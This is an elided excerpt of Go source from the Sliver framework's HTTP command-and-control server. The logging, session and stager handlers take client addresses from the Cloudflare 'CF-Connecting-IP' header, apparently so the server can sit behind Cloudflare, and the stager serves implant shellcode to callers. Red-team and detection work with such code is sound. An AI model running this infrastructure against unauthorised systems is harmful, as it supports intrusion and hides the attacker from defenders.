...
func loggingMiddleware(next http.Handler) http.Handler {
        return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
                accessLog.Infof("%s - %s - %v", req.Header.Get("CF-Connecting-IP"), req.RequestURI, req.Header.Get("User-Agent"))
...
func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
        ...
        httpSession.Session = core.Sessions.Add(&core.Session{
                ...
                Transport:     "http(s)",
                RemoteAddress: req.Header.Get("CF-Connecting-IP"),
...
func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
        if len(s.SliverStage) != 0 {
                httpLog.Infof("Received staging request from %s", req.Header.Get("CF-Connecting-IP"))
                resp.Write(s.SliverStage)
                httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), req.Header.Get("CF-Connecting-IP"))
                resp.WriteHeader(200)
        } else {
                resp.WriteHeader(404)
        }
